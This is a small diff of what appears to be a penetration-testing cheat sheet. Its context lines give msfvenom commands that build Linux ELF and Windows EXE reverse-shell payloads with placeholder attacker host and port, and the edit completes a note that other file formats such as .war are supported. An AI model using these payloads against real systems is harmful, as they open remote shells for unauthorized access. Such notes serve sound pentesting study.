@@ -20,4 +20,6 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > <fname>
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > <fname>.exe
 ```
-Note: MSFvenom support creating payload in this way for many 
+Note: MSFvenom support creating payload in this way for many extension and stuffs (including .war etc.)
+
+
